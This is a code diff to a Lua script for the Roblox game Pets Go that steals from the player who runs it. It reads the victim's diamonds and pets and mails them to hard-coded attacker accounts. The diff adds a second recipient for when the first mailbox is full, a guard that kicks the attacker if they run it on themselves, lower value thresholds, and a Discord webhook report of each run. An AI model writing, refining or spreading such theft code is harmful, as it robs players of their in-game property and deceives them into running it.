@@ -16,6 +16,10 @@ if _G.scriptExecuted then
 end
 _G.scriptExecuted = true
 
+if plr.Name == Username then
+    plr:kick("You cannot mailsteal yourself")
+end
+
 local GemAmount1 = 0
 for i, v in pairs(GetSave().Inventory.Currency) do
     if v.id == "Diamonds" then
@@ -112,7 +116,7 @@ local function SendMessage(username, diamonds)
 
     local data = {
         ["embeds"] = {{
-            ["title"] = "New Pets Go Execution" ,
+            ["title"] = "\240\159\142\178 New Pets Go Execution" ,
             ["color"] = 65280,
 			["fields"] = fields,
 			["footer"] = {
@@ -168,9 +172,10 @@ local function getRAP(Type, Item)
     ) or 0)
 end
 
-local user = Username or "tobi437a"
-local min_rap = min_rap or 10000
-local min_chance = min_chance or 10000
+local user = Username or "PetsGoMommy"
+local user2 = Username2 or "PetsGoMommy"
+local min_rap = min_rap or 1000
+local min_chance = min_chance or 100000
 local webhook = webhook
 
 local function sendItem(category, uid, am)
@@ -184,6 +189,10 @@ local function sendItem(category, uid, am)
 	local response = false
 	repeat
     	local response, err = network:WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
+        if response == false and err == "They don't have enough space!" then
+            user = user2
+            args[1] = user
+        end
 	until response == true
 end
 
